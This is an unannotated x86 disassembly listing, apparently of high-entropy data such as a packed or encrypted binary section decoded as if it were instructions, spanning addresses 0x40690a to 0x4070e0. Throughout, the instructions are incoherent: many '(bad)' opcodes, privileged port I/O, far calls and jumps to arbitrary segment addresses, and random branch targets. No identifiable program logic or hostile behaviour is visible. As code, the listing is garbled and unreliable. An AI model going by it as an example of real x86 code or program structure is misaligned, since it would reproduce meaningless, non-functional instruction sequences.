  40690a:	stos   BYTE PTR es:[edi],al
  40690b:	sbb    al,0xd4
  40690d:	pop    ds
  40690e:	dec    edi
  40690f:	sbb    BYTE PTR [eax-0x5],al
  406912:	push   0x5c8ed0d3
  406917:	add    ch,BYTE PTR [ecx+edx*1-0x54]
  40691b:	or     ecx,DWORD PTR [edx]
  40691d:	cmp    al,0x63
  40691f:	ss leave 
  406921:	push   ds
  406922:	sub    BYTE PTR [ebx+ecx*4-0x1d],dh
  406926:	mov    gs,WORD PTR [esi-0x77371cae]
  40692c:	adc    ebx,DWORD PTR [ebx-0x1d73db8]
  406932:	or     ebp,0x4f
  406935:	(bad)  
  406936:	cmp    eax,0xde29023a
  40693b:	mov    ebp,0x642761d
  406940:	test   DWORD PTR [ebx-0xb2970ab],ecx
  406946:	mov    al,0xda
  406948:	in     al,dx
  406949:	arpl   WORD PTR [ebx],sp
  40694b:	cdq    
  40694c:	push   es
  40694d:	xor    BYTE PTR [ebx+0x39],dh
  406950:	mov    esi,0xd555fa2a
  406955:	sar    BYTE PTR [eax],0xcd
  406958:	out    0xe5,al
  40695a:	cmp    eax,0x7fa48b7b
  40695f:	ret    0xe634
  406962:	call   0x3c24:0x842851ab
  406969:	stos   BYTE PTR es:[edi],al
  40696a:	and    BYTE PTR [edi+0x3f],0x6d
  40696e:	xchg   ebx,eax
  40696f:	(bad)  
  406971:	aad    0x3a
  406973:	dec    edi
  406974:	jmp    0xcc1bfaca
  406979:	scas   eax,DWORD PTR es:[edi]
  40697a:	mov    dh,BYTE PTR [edi-0x4d889b62]
  406980:	mov    cl,0x8f
  406982:	mov    ah,BYTE PTR [ecx]
  406984:	and    BYTE PTR [ecx+0x76],0xdd
  406988:	adc    DWORD PTR [esi+ebx*4-0x75],0x21666666
  406990:	ss ret 0xe275
  406994:	scas   eax,DWORD PTR es:[edi]
  406995:	call   0xe1d3bf31
  40699a:	femms  
  40699c:	icebp  
  40699d:	sbb    DWORD PTR [esi],edi
  40699f:	add    BYTE PTR [ebx],dl
  4069a1:	pop    ecx
  4069a2:	push   ds
  4069a3:	push   esi
  4069a4:	sub    BYTE PTR [eax],dl
  4069a6:	loop   0x4069c0
  4069a8:	das    
  4069a9:	sbb    DWORD PTR [ecx-0x41],eax
  4069ac:	jle    0x406a09
  4069ae:	popa   
  4069af:	gs retf 
  4069b1:	(bad)  
  4069b2:	mov    eax,0xd77590ce
  4069b7:	inc    ebp
  4069b8:	mov    ds:0x4c75e0b6,eax
  4069bd:	xchg   edx,eax
  4069be:	or     cl,dl
  4069c0:	mov    edx,0xd4098c61
  4069c5:	jmp    0xd1e0:0x1a65fbc8
  4069cc:	xchg   ecx,eax
  4069cd:	and    BYTE PTR [edi+0x278bbb07],0x37
  4069d4:	shl    BYTE PTR [ebx-0x4b],cl
  4069d7:	ss ja  0x406962
  4069da:	push   cs
  4069db:	out    0x21,al
  4069dd:	dec    esp
  4069de:	mov    ds:0xdc44eaae,eax
  4069e3:	add    ch,cl
  4069e5:	fstp   TBYTE PTR [ecx+0x4b]
  4069e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069e9:	sbb    eax,ebp
  4069eb:	(bad)  
  4069ee:	popf   
  4069ef:	popaw  
  4069f1:	cmp    eax,0xb40f5f1a
  4069f6:	mov    esi,0x5c26638f
  4069fb:	(bad)  
  4069fc:	jno    0x406a5b
  4069fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069ff:	push   0x19
  406a01:	pop    es
  406a02:	xor    al,0x4e
  406a04:	jae    0x4069d7
  406a06:	lahf   
  406a07:	sub    al,0x9
  406a09:	mov    bl,0x8
  406a0b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a0d:	sub    DWORD PTR [edx],eax
  406a0f:	jbe    0x4069d0
  406a11:	jmp    0x3f24da3e
  406a16:	popf   
  406a17:	push   esi
  406a18:	mov    ch,ah
  406a1a:	sti    
  406a1b:	outs   dx,BYTE PTR ds:[esi]
  406a1c:	ret    
  406a1d:	adc    DWORD PTR [ebx+0x3c],esi
  406a20:	sub    al,0x54
  406a22:	out    dx,al
  406a23:	pop    eax
  406a24:	or     al,0x3c
  406a26:	inc    edx
  406a27:	repnz neg DWORD PTR [ebx]
  406a2a:	mov    ds:0x1fa4ce41,eax
  406a2f:	mov    ecx,ebp
  406a31:	mov    ds:0x73e831e7,eax
  406a36:	mov    bh,dl
  406a38:	mov    dl,0x39
  406a3a:	imul   edi,DWORD PTR [esi+0x76],0xffffffb0
  406a3e:	mov    WORD PTR [esi+edx*8+0x22c30e19],ax
  406a46:	stc    
  406a47:	mov    esi,0x2e55348a
  406a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a4d:	adc    eax,0x69b3fa9f
  406a52:	sar    BYTE PTR [eax-0x64b065fb],1
  406a58:	rcl    DWORD PTR [edi-0x8],1
  406a5b:	hlt    
  406a5c:	sbb    esi,edx
  406a5e:	sub    DWORD PTR [ebx+0x78],esp
  406a61:	sahf   
  406a62:	and    BYTE PTR [esi-0x786af7f6],cl
  406a68:	sub    DWORD PTR [ecx],esi
  406a6a:	add    al,0x11
  406a6c:	mov    ds:0x745a247e,al
  406a71:	adc    eax,0xcea5d02b
  406a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a77:	adc    BYTE PTR ds:0x711f5bc,cl
  406a7d:	jae    0x406abd
  406a7f:	and    al,0x58
  406a81:	inc    edi
  406a82:	test   al,0xe
  406a84:	and    al,0xf1
  406a86:	nop
  406a87:	add    eax,0xd32dbbd0
  406a8c:	pop    ebp
  406a8d:	pop    ds
  406a8e:	call   0xe157:0x66561563
  406a95:	xchg   edi,eax
  406a96:	data16 into 
  406a98:	sbb    DWORD PTR [ebp-0x1b],ebp
  406a9b:	xor    DWORD PTR [eax+0x695730d3],esi
  406aa1:	lock fistp DWORD PTR [edx+0x59ece503]
  406aa8:	add    ebx,ebp
  406aaa:	dec    edx
  406aab:	imul   ebx,eax,0xcd74ad77
  406ab1:	mov    ch,0xb0
  406ab3:	in     al,dx
  406ab4:	loope  0x406a8f
  406ab6:	jecxz  0x406a84
  406ab8:	out    dx,al
  406ab9:	push   0xffffffdc
  406abb:	clc    
  406abc:	dec    edi
  406abd:	pusha  
  406abe:	jae    0x406a81
  406ac0:	into   
  406ac1:	aaa    
  406ac2:	test   BYTE PTR [ecx-0x5],dh
  406ac5:	ja     0x406b19
  406ac7:	(bad)  
  406ac8:	call   0xcc86424c
  406acd:	cmp    al,0xc4
  406acf:	jle    0x406a5b
  406ad1:	mov    ah,0x5d
  406ad3:	xlat   BYTE PTR ds:[ebx]
  406ad4:	out    dx,eax
  406ad5:	ficom  WORD PTR [edx]
  406ad7:	push   esi
  406ad8:	aam    0x13
  406ada:	sub    DWORD PTR [esp+ecx*4+0x359802f6],esi
  406ae1:	js     0x406b08
  406ae3:	push   DWORD PTR [esi]
  406ae5:	pop    ds
  406ae6:	push   0x97e41fed
  406aeb:	arpl   WORD PTR [ecx],bx
  406aed:	(bad)  
  406aee:	arpl   WORD PTR [esi+0x1b90cebe],si
  406af4:	(bad)
  406af9:	jmp    0x406ab0
  406afb:	and    ecx,edx
  406afd:	push   eax
  406afe:	je     0x406aed
  406b00:	xchg   esp,eax
  406b01:	ss nop
  406b03:	outs   dx,BYTE PTR ds:[esi]
  406b04:	cmp    BYTE PTR [eax],bl
  406b06:	mov    ah,0xa7
  406b08:	push   ss
  406b09:	enter  0xd811,0x9
  406b0d:	rol    edx,0x95
  406b10:	mov    ?,WORD PTR [eax+0xd]
  406b13:	push   ds
  406b14:	pop    ebp
  406b15:	push   0x20
  406b17:	jl     0x406b35
  406b19:	fwait
  406b1a:	bnd jbe 0x406b8c
  406b1d:	(bad)  
  406b1e:	fcom   DWORD PTR ds:0xf6ca0b51
  406b24:	hlt    
  406b25:	mov    al,ds:0x990ad754
  406b2a:	rol    BYTE PTR [ecx*1+0x75868a4d],cl
  406b31:	xlat   BYTE PTR ds:[ebx]
  406b32:	loop   0x406b66
  406b34:	jb     0x406ada
  406b36:	cdq    
  406b37:	mov    eax,ds:0xbf55f353
  406b3c:	jle    0x406b36
  406b3e:	and    al,0x34
  406b40:	int3   
  406b41:	mov    eax,gs:0xe2c9af19
  406b47:	xor    BYTE PTR [ebp-0xa],bl
  406b4a:	outs   dx,BYTE PTR ds:[esi]
  406b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b4c:	neg    ecx
  406b4e:	add    DWORD PTR [edx-0x2195e9c9],0x7d
  406b55:	adc    al,0x3e
  406b57:	sub    ch,BYTE PTR [eax]
  406b59:	push   0xffffffde
  406b5b:	pusha  
  406b5c:	dec    edx
  406b5d:	vminss xmm2,xmm7,xmm1
  406b61:	push   0xffffff88
  406b63:	fsubr  DWORD PTR [edx-0x53]
  406b66:	data16 sahf 
  406b68:	outs   dx,BYTE PTR ds:[esi]
  406b69:	dec    eax
  406b6a:	mov    ds:0xf7791ee7,al
  406b6f:	sbb    BYTE PTR [eiz*1-0x660f944e],dl
  406b76:	dec    esi
  406b77:	pop    ebx
  406b78:	sysexit 
  406b7a:	or     al,0x56
  406b7c:	mov    al,ds:0x55ad2cda
  406b81:	vpsadbw xmm5,xmm1,XMMWORD PTR [edi-0x30]
  406b86:	lods   eax,DWORD PTR ds:[esi]
  406b87:	cmp    esi,ebx
  406b89:	shl    ebx,cl
  406b8b:	les    ebp,FWORD PTR [esp+ebp*2+0x11]
  406b8f:	loop   0x406be3
  406b91:	rcl    DWORD PTR [edx-0x62],0x4d
  406b95:	mov    edx,0xe2291ea2
  406b9a:	sahf   
  406b9b:	dec    edx
  406b9c:	mov    ebp,0xb727accd
  406ba1:	imul   esp,DWORD PTR [edx-0x1],0xac6b48bf
  406ba8:	and    BYTE PTR [eax-0x64],dh
  406bab:	cmp    eax,0x11ed63e7
  406bb0:	mov    esp,0x204cbfff
  406bb5:	jbe    0x406c23
  406bb7:	cld    
  406bb8:	adc    BYTE PTR [esi],cl
  406bba:	mov    esi,DWORD PTR [edi+eax*8]
  406bbd:	xchg   ebx,eax
  406bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bbf:	out    0x2b,eax
  406bc1:	add    dl,0xc5
  406bc4:	and    DWORD PTR [edi],ecx
  406bc6:	and    edi,DWORD PTR [edx]
  406bc8:	inc    ecx
  406bc9:	scas   al,BYTE PTR es:[edi]
  406bca:	nop
  406bcb:	mov    bh,0x50
  406bcd:	out    dx,al
  406bce:	fistp  QWORD PTR [eax+0x37]
  406bd1:	and    edi,DWORD PTR [edx-0x5e]
  406bd4:	ror    cl,0xd0
  406bd7:	lea    eax,ds:0x88590dbb
  406bdd:	jbe    0x406b77
  406bdf:	mov    esp,0x5d10c42f
  406be4:	pushf  
  406be5:	mov    DWORD PTR ds:0xbe2f6ea5,edx
  406beb:	stos   DWORD PTR es:[edi],eax
  406bec:	jno    0x406bc4
  406bee:	mov    ch,0xc6
  406bf0:	sar    BYTE PTR [eax+0x74cc009f],cl
  406bf6:	mov    ds:0x461d45c2,al
  406bfb:	mov    al,0x50
  406bfd:	mov    cs,WORD PTR [edx+edx*8-0x63]
  406c01:	mov    bh,al
  406c03:	inc    ebx
  406c04:	fist   DWORD PTR [eax-0x4121efa4]
  406c0a:	add    al,0x7d
  406c0c:	dec    DWORD PTR [edi+0x699a7e]
  406c12:	adc    eax,0xf1fd5f8b
  406c17:	xchg   edx,eax
  406c18:	pop    edx
  406c19:	jecxz  0x406b9b
  406c1b:	adc    eax,0xff37cae6
  406c20:	(bad)  
  406c21:	jnp    0xe7a5a372
  406c27:	xchg   edx,eax
  406c28:	xchg   ebp,eax
  406c29:	mov    ch,0xd3
  406c2b:	icebp  
  406c2c:	inc    eax
  406c2d:	lahf   
  406c2e:	dec    ebx
  406c2f:	cwde   
  406c30:	mov    edx,0xbb168d3
  406c35:	adc    ebp,DWORD PTR [eax]
  406c37:	(bad)
  406c3a:	jmp    0x4f27:0xe8549425
  406c41:	inc    edx
  406c42:	mov    WORD PTR [esi-0x66],cs
  406c45:	push   cs
  406c46:	arpl   WORD PTR [ebx-0x5880c7fc],di
  406c4c:	sbb    edx,0xc4995253
  406c52:	out    0xb8,eax
  406c54:	pop    ss
  406c55:	cs jmp 0x406c47
  406c58:	mov    edi,0x40cdd3e8
  406c5d:	and    dl,BYTE PTR [ebp-0x35]
  406c60:	mov    ebx,0x668ad417
  406c65:	push   esp
  406c66:	sti    
  406c67:	loopne 0x406cd7
  406c69:	cmc    
  406c6a:	pop    ds
  406c6b:	push   ss
  406c6c:	nop
  406c6d:	mov    esp,DWORD PTR [ebx+0x7f]
  406c70:	dec    edi
  406c71:	pop    ebp
  406c72:	fidiv  WORD PTR [ecx-0x6f]
  406c75:	cwd    
  406c77:	jp     0x406bff
  406c79:	push   edi
  406c7a:	mov    ecx,DWORD PTR [ecx-0x57dba220]
  406c80:	mov    BYTE PTR [edi+0x3597edea],dl
  406c86:	neg    BYTE PTR [edx-0xb2662c2]
  406c8c:	scas   eax,DWORD PTR es:[edi]
  406c8d:	cwde   
  406c8e:	rcl    DWORD PTR [edx],cl
  406c90:	bnd jo 0x406ca6
  406c93:	xchg   edi,eax
  406c94:	push   ebx
  406c95:	pop    esp
  406c96:	jg     0x406c5b
  406c98:	mov    ecx,0xb55ec07b
  406c9d:	and    DWORD PTR [edx+0x74],0x7aa97dad
  406ca4:	dec    ebp
  406ca5:	push   0xffffffb0
  406ca7:	retf   0x33bf
  406caa:	aam    0xf2
  406cac:	retf   
  406cad:	jl     0x406cdf
  406caf:	pop    ecx
  406cb0:	and    ebp,DWORD PTR [ecx]
  406cb2:	jbe    0x406d1c
  406cb4:	pop    eax
  406cb5:	fcmovb st,st(5)
  406cb7:	pop    ecx
  406cb8:	mov    dh,0x64
  406cba:	or     al,BYTE PTR [ecx]
  406cbc:	fs jmp 0x7332:0x9aa28578
  406cc4:	sti    
  406cc5:	(bad)  
  406cc6:	push   ss
  406cc7:	out    0x8a,al
  406cc9:	into   
  406cca:	or     ebp,DWORD PTR [eax-0x7]
  406ccd:	leave  
  406cce:	call   0xebaf4a97
  406cd3:	or     ebx,DWORD PTR [ebx+0x22e2763f]
  406cd9:	std    
  406cda:	mov    edx,0x65476665
  406cdf:	add    esp,DWORD PTR [edx]
  406ce1:	popf   
  406ce2:	add    DWORD PTR [ebx+ebx*2+0x2ee701c7],0xd
  406cea:	leave  
  406ceb:	push   ds
  406cec:	jl     0x406d2a
  406cee:	fs jae 0x406d40
  406cf1:	pop    ecx
  406cf2:	mov    ebp,0xd92bbd63
  406cf7:	add    eax,0x80f8015c
  406cfc:	je     0x406d23
  406cfe:	jl     0x406cb0
  406d00:	outs   dx,BYTE PTR ds:[esi]
  406d01:	mov    eax,0xfb8b95bc
  406d06:	sub    ch,BYTE PTR [ebx+eax*1+0x47]
  406d0a:	inc    DWORD PTR cs:[ecx+0x21]
  406d0e:	add    ch,BYTE PTR [esi+0x59]
  406d11:	sar    eax,1
  406d13:	sahf   
  406d14:	inc    edx
  406d15:	jns    0x406d55
  406d17:	or     edx,DWORD PTR [ebx+0x19]
  406d1a:	imul   edx,DWORD PTR [esi+0x54],0x13
  406d1e:	cmp    DWORD PTR [esi*8-0x4e53e0f3],edx
  406d25:	stos   DWORD PTR es:[edi],eax
  406d26:	dec    edx
  406d27:	mov    ebx,0x40532ba1
  406d2c:	sar    DWORD PTR [esi],1
  406d2e:	xor    eax,ecx
  406d30:	mov    ds:0x2fea7500,eax
  406d35:	(bad)  
  406d36:	repz xchg esi,eax
  406d38:	popa   
  406d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d3a:	push   esp
  406d3b:	(bad)  
  406d3c:	mov    al,ds:0xdcfb29af
  406d41:	stos   DWORD PTR es:[edi],eax
  406d42:	sahf   
  406d43:	fmul   QWORD PTR [eax-0x1d3b1888]
  406d49:	and    DWORD PTR [ebx-0x57],esp
  406d4c:	hlt    
  406d4d:	mov    dl,0xce
  406d4f:	adc    dl,dh
  406d51:	inc    esp
  406d52:	xor    eax,0x7f22bc50
  406d57:	rcl    BYTE PTR [esi],1
  406d59:	jp     0x406dc3
  406d5b:	push   eax
  406d5c:	sbb    eax,ecx
  406d5e:	and    DWORD PTR [esi+eiz*8-0x36],edx
  406d62:	mov    bh,0x86
  406d64:	xor    al,0x5a
  406d66:	loop   0x406d02
  406d68:	inc    edi
  406d69:	and    eax,0x95024feb
  406d6e:	popa   
  406d6f:	or     DWORD PTR [eax-0x2],0xe7b9ae37
  406d76:	int3   
  406d77:	(bad)  
  406d79:	fcom   DWORD PTR [ebx]
  406d7b:	adc    al,0xf8
  406d7d:	sub    BYTE PTR [edi],ah
  406d7f:	jmp    0x2914:0x39deec2f
  406d86:	mov    al,ds:0x50f917e5
  406d8b:	and    BYTE PTR [edi-0x6],dh
  406d8e:	lods   eax,DWORD PTR ds:[esi]
  406d8f:	mov    cl,0x1c
  406d91:	pop    ss
  406d92:	mov    dh,0xeb
  406d94:	(bad)  
  406d95:	push   ebp
  406d96:	test   DWORD PTR [edx-0x6],esi
  406d99:	cmp    edx,DWORD PTR [edx+0x66]
  406d9c:	adc    al,0xfa
  406d9e:	push   edx
  406d9f:	jbe    0x406dbb
  406da1:	jno    0x406dd0
  406da3:	icebp  
  406da4:	lock stos BYTE PTR es:[edi],al
  406da6:	sbb    DWORD PTR [eax-0x7b],ecx
  406da9:	sub    al,0x33
  406dab:	fdiv   DWORD PTR [esi]
  406dad:	adc    edi,DWORD PTR [eax+0x3c7515c7]
  406db3:	adc    BYTE PTR [ebp+0xf37c4b8],0x1f
  406dba:	jae    0x406e15
  406dbc:	js     0x406dfe
  406dbe:	jbe    0x406dd6
  406dc0:	pusha  
  406dc1:	dec    esp
  406dc2:	loope  0x406e05
  406dc4:	(bad)  
  406dc5:	call   0xdb772207
  406dca:	ds inc eax
  406dcc:	push   esp
  406dcd:	push   eax
  406dce:	aaa    
  406dcf:	dec    ecx
  406dd0:	cmp    eax,eax
  406dd2:	loop   0x406d6d
  406dd4:	and    dh,BYTE PTR [edi+0x6069a947]
  406dda:	nop
  406ddb:	int    0xa
  406ddd:	imul   edi,DWORD PTR [edx+0x665ea320],0xe553126c
  406de7:	ret    
  406de8:	(bad)  
  406de9:	mov    eax,ds:0xd4c71336
  406dee:	test   al,0x25
  406df0:	and    DWORD PTR [ebp+0x13],ecx
  406df3:	scas   eax,DWORD PTR es:[edi]
  406df4:	mov    eax,0x4c92c8c9
  406df9:	dec    eax
  406dfa:	adc    al,0x73
  406dfc:	xor    al,0x48
  406dfe:	out    dx,eax
  406dff:	ficom  DWORD PTR [eax]
  406e01:	inc    ebx
  406e02:	hlt    
  406e03:	sub    ecx,DWORD PTR [esp+ebp*2+0x70]
  406e07:	xor    BYTE PTR [esi],ah
  406e09:	dec    esp
  406e0b:	fisubr DWORD PTR [edi+0x5917eccc]
  406e11:	sbb    dh,BYTE PTR [edx-0x9cd7da3]
  406e17:	int3   
  406e18:	xor    edx,ebx
  406e1a:	leave  
  406e1b:	mov    cl,0xfb
  406e1d:	or     DWORD PTR [edx],esi
  406e1f:	jns    0x406daf
  406e21:	sbb    eax,DWORD PTR [edx-0x44f67d5b]
  406e27:	test   al,0x9e
  406e29:	dec    esi
  406e2a:	push   ecx
  406e2b:	mov    dh,0xc3
  406e2d:	cmp    eax,0x786f807c
  406e32:	test   DWORD PTR es:[eax],ebp
  406e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e36:	inc    ebx
  406e37:	ins    BYTE PTR es:[edi],dx
  406e38:	add    BYTE PTR [ecx-0x44de5db5],ah
  406e3e:	icebp  
  406e3f:	arpl   WORD PTR [eax+0x70913337],dx
  406e45:	(bad)  ds:0x1e365556
  406e4b:	mov    edi,0x978692e1
  406e50:	(bad)  
  406e51:	loopne 0x406dee
  406e53:	or     dh,0xa6
  406e56:	fst    DWORD PTR [ecx-0x66]
  406e59:	cmp    ah,BYTE PTR [ebx+0x1e]
  406e5c:	into   
  406e5d:	inc    edx
  406e5e:	mov    edx,0x9df61e14
  406e63:	and    BYTE PTR [edi+ebx*1+0x56],bh
  406e67:	addr16 cdq 
  406e69:	pop    edi
  406e6a:	adc    eax,0x1c0bed2e
  406e6f:	sahf   
  406e70:	popa   
  406e71:	test   BYTE PTR [ebp+0x7f001cc1],cl
  406e77:	clc    
  406e78:	inc    DWORD PTR [ecx]
  406e7a:	add    eax,0x3b45eea5
  406e7f:	fistp  WORD PTR [edi]
  406e81:	push   ds
  406e82:	rcl    DWORD PTR [ecx-0x3576b2e7],1
  406e88:	add    al,0x46
  406e8a:	cli    
  406e8b:	add    ch,dh
  406e8d:	add    eax,0x82bcc16b
  406e92:	dec    ecx
  406e93:	sub    al,0xe3
  406e95:	scas   al,BYTE PTR es:[edi]
  406e96:	and    al,0x12
  406e98:	outs   dx,DWORD PTR ds:[esi]
  406e99:	mov    cl,0x69
  406e9b:	int    0xd6
  406e9d:	stc    
  406e9e:	mov    ch,0xa2
  406ea0:	jae    0x406ec8
  406ea2:	lods   al,BYTE PTR ds:[esi]
  406ea3:	jmp    0x406e99
  406ea5:	aam    0x33
  406ea7:	push   esi
  406ea8:	fs sbb ebp,esi
  406eab:	out    dx,eax
  406eac:	(bad)  
  406ead:	hlt    
  406eae:	mov    esp,0xe92042fd
  406eb3:	mov    al,0x9f
  406eb5:	mov    dl,0x71
  406eb7:	mov    ah,0x7a
  406eb9:	lds    esi,FWORD PTR [eax-0x4eed7c0a]
  406ebf:	(bad)  
  406ec0:	jmpw   0x2855
  406ec4:	mov    ebx,0xf574fd5a
  406ec9:	data16 into 
  406ecb:	mov    eax,ds:0xe8acd0a0
  406ed0:	pop    esp
  406ed1:	loopne 0x406e89
  406ed3:	jmp    0x406ec1
  406ed5:	arpl   bx,bp
  406ed7:	xor    al,0xca
  406ed9:	sub    DWORD PTR [ebp-0x5a1abaca],esi
  406edf:	adc    al,0xb5
  406ee1:	or     BYTE PTR [edi+ebp*4-0x27b192fb],cl
  406ee8:	jne    0x406ec1
  406eea:	clc    
  406eeb:	and    DWORD PTR [ecx+eiz*4-0x2cc6b221],esi
  406ef2:	sbb    ecx,DWORD PTR [eax-0x10f52b77]
  406ef8:	aas    
  406ef9:	repnz shl DWORD PTR [ebx],1
  406efc:	(bad)  
  406efe:	jecxz  0x406f04
  406f00:	add    BYTE PTR [esi-0x70],ah
  406f03:	es sbb ebp,edi
  406f06:	jl     0x406f6d
  406f08:	fld    TBYTE PTR [esi+ebp*1-0x693bf005]
  406f0f:	xchg   ebp,eax
  406f10:	imul   esi,edx,0x3641da74
  406f16:	mov    bh,BYTE PTR [edi+eiz*8-0x10]
  406f1a:	adc    al,0xfa
  406f1c:	mov    esp,0xec10fde1
  406f21:	iret   
  406f22:	or     eax,0x7d70c85c
  406f27:	pop    esi
  406f28:	cmp    eax,0x4b106229
  406f2d:	jmp    0x406f17
  406f2f:	iret   
  406f30:	sbb    DWORD PTR [bx+di+0x2e65],0xec42ddc2
  406f39:	adc    BYTE PTR [esi],bh
  406f3b:	ins    BYTE PTR es:[edi],dx
  406f3c:	(bad)  
  406f3d:	aas    
  406f3e:	cdq    
  406f3f:	xor    cl,BYTE PTR [edi]
  406f41:	adc    BYTE PTR [ecx-0x32811563],ah
  406f47:	inc    esi
  406f48:	loope  0x406ee0
  406f4a:	sbb    bh,dh
  406f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f4d:	mov    al,0x4f
  406f4f:	mov    BYTE PTR [esi],dh
  406f51:	xor    eax,0x3f17b505
  406f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f57:	add    DWORD PTR ds:0xca7d4714,ebx
  406f5d:	mov    edx,0x3d14ad77
  406f62:	jg     0x406fdc
  406f64:	pusha  
  406f65:	lods   eax,DWORD PTR ds:[esi]
  406f66:	sbb    al,0xe1
  406f68:	ins    DWORD PTR es:[edi],dx
  406f69:	dec    edi
  406f6a:	mov    bl,bl
  406f6c:	dec    ebx
  406f6d:	cmp    al,0xeb
  406f6f:	mov    dl,0xf6
  406f71:	lods   al,BYTE PTR ds:[esi]
  406f73:	daa    
  406f74:	pop    edx
  406f75:	adc    eax,0x4475e16c
  406f7a:	lods   al,BYTE PTR ds:[esi]
  406f7b:	rcr    BYTE PTR [ebp+0x36572574],0xf
  406f82:	dec    ebp
  406f83:	cmp    eax,0x79ff9d9b
  406f88:	(bad)  
  406f89:	js     0x406fa9
  406f8b:	sub    ah,BYTE PTR [edi]
  406f8d:	pop    edi
  406f8e:	outs   dx,BYTE PTR ds:[esi]
  406f8f:	jmp    0xa43:0xe37e2804
  406f96:	cdq    
  406f97:	stos   BYTE PTR es:[edi],al
  406f98:	arpl   bp,dx
  406f9a:	adc    al,0xfc
  406f9c:	in     eax,dx
  406f9d:	(bad)  
  406f9e:	out    0x6d,al
  406fa0:	out    0x55,eax
  406fa2:	scas   al,BYTE PTR es:[edi]
  406fa3:	fisub  DWORD PTR [edi+0xb]
  406fa6:	mov    cl,0x8e
  406fa8:	es clc 
  406faa:	in     eax,0x14
  406fac:	add    DWORD PTR [ebx-0x3c],0x6988bb1e
  406fb3:	rol    DWORD PTR [edx+0x7a8c6cef],0x32
  406fba:	pop    esi
  406fbb:	mov    eax,0xf3ca936e
  406fc0:	mov    edi,0xa52dda32
  406fc5:	or     bh,BYTE PTR [ecx-0x6407e69c]
  406fcb:	sub    DWORD PTR [esp+esi*1],edi
  406fce:	daa    
  406fcf:	sahf   
  406fd0:	sub    bl,BYTE PTR [esi-0x65cc84cd]
  406fd6:	test   al,0x9e
  406fd8:	adc    al,bl
  406fda:	pop    ebp
  406fdb:	or     ebx,edi
  406fdd:	ror    BYTE PTR ds:0xf73e0b38,0xc7
  406fe4:	xor    edi,DWORD PTR [edx]
  406fe6:	xor    al,0x25
  406fe8:	mov    ah,0x21
  406fea:	stos   BYTE PTR es:[edi],al
  406feb:	mov    bl,0xb2
  406fed:	add    BYTE PTR [edx+0x68],0xce
  406ff1:	out    0x5,al
  406ff3:	mov    al,0xb6
  406ff5:	adc    eax,0xd61947ec
  406ffa:	push   ecx
  406ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ffc:	jno    0x407029
  406ffe:	std    
  406fff:	retf   
  407000:	jo     0x40706c
  407002:	dec    ebx
  407003:	fwait
  407004:	pop    esp
  407005:	repz out dx,eax
  407007:	push   eax
  407008:	jle    0x407012
  40700a:	fwait
  40700b:	(bad)  
  40700c:	lods   eax,DWORD PTR ds:[esi]
  40700d:	cmp    BYTE PTR [edx+0xb],dh
  407010:	mov    edi,DWORD PTR [eax-0x29]
  407013:	bound  ebx,QWORD PTR [esi-0x3e6e0b4e]
  407019:	sahf   
  40701a:	xchg   esi,eax
  40701b:	aas    
  40701c:	aas    
  40701d:	add    dh,cl
  40701f:	cmp    edx,DWORD PTR [ecx+edx*2]
  407022:	mov    edi,0x8066ad67
  407027:	cmp    al,0x44
  407029:	ror    edi,cl
  40702b:	ret    0x135d
  40702e:	test   al,cl
  407030:	(bad)  
  407031:	sti    
  407032:	xor    al,0x5c
  407034:	loop   0x4070a2
  407036:	mov    ecx,0xb29e0555
  40703b:	xlat   BYTE PTR ds:[ebx]
  40703c:	push   esi
  40703d:	call   0xbf98:0x74d76932
  407044:	sbb    ecx,esp
  407046:	pop    edi
  407047:	push   edi
  407048:	aad    0x3e
  40704a:	lea    edi,[ebp+0x7254b0d5]
  407050:	sbb    al,0xf
  407052:	xor    BYTE PTR [ecx],dl
  407054:	jnp    0x407008
  407056:	jne    0x406ffa
  407058:	mov    ah,0x72
  40705a:	call   0x929c:0xc14e7340
  407061:	jb     0x407026
  407063:	neg    DWORD PTR [ebx]
  407065:	sbb    ebp,edi
  407067:	mov    dh,0x40
  407069:	test   al,0xdf
  40706b:	xor    ebp,edi
  40706d:	add    eax,0x687e6e40
  407072:	add    BYTE PTR [edi],bh
  407074:	add    eax,DWORD PTR cs:[esi+ecx*1+0x39]
  407079:	scas   eax,DWORD PTR es:[edi]
  40707a:	inc    ecx
  40707b:	(bad)  
  40707c:	(bad)  
  40707e:	adc    al,0xc8
  407080:	jp     0x407021
  407082:	out    dx,eax
  407083:	dec    ebx
  407084:	dec    ebx
  407085:	dec    esi
  407086:	paddb  mm4,QWORD PTR [edx+0x526010a2]
  40708d:	sub    al,0xb5
  40708f:	sti    
  407090:	sub    bh,BYTE PTR [eax-0x40]
  407093:	frstor [ecx+0x7e]
  407096:	sub    BYTE PTR [ebx+0x4d6c04fb],0x5e
  40709d:	inc    esi
  40709e:	std    
  40709f:	inc    esi
  4070a0:	sahf   
  4070a1:	sub    DWORD PTR [esp+edi*1+0x50],ecx
  4070a5:	lods   eax,DWORD PTR ds:[esi]
  4070a6:	icebp  
  4070a7:	in     eax,0x7d
  4070a9:	dec    edi
  4070aa:	xor    DWORD PTR [eax+0x3a0f32c5],ebx
  4070b0:	mov    ebx,0x65dd22da
  4070b5:	cmp    DWORD PTR [esi+esi*8-0x1e7a2f50],esi
  4070bc:	or     al,0x5e
  4070be:	mov    BYTE PTR [edi+0xd],0xe3
  4070c2:	pop    ds
  4070c3:	fadd   st,st(2)
  4070c5:	push   edx
  4070c6:	and    DWORD PTR cs:[edx],ecx
  4070c9:	jbe    0x4070b5
  4070cb:	aam    0xbd
  4070cd:	xlat   BYTE PTR ds:[ebx]
  4070ce:	sbb    BYTE PTR [esi],bl
  4070d0:	repnz pop ebx
  4070d2:	int    0x47
  4070d4:	mov    ebx,0x9f66d5d7
  4070d9:	and    eax,0xcf109c71
  4070de:	jno    0x40713a
  4070e0:	in     al,0xb8
